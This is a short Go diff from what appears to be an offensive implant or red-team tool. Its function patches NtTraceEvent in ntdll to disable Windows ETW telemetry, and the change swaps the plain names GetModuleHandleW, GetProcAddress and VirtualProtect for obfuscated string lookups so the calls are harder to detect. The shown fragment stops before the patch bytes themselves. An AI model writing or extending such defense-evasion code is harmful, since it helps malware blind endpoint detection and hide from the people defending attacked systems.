@@ -13,9 +13,9 @@ func etwNtTraceEvent() string {
 		return "NtTraceEvent bypass: disabled by EDR strategy"
 	}
 	k32 := syscall.NewLazyDLL("kernel32.dll")
-	getModuleHandle := k32.NewProc("GetModuleHandleW")
-	getProcAddress := k32.NewProc("GetProcAddress")
-	virtualProtect := k32.NewProc("VirtualProtect")
+	getModuleHandle := k32.NewProc(s(SProcGModuleW))
+	getProcAddress := k32.NewProc(s(SProcGProcAddr))
+	virtualProtect := k32.NewProc(s(SProcVProtect))
 
 	// Patch NtTraceEvent in ntdll (deeper than EtwEventWrite)
 	namePtr, _ := syscall.UTF16PtrFromString("ntdll.dll")
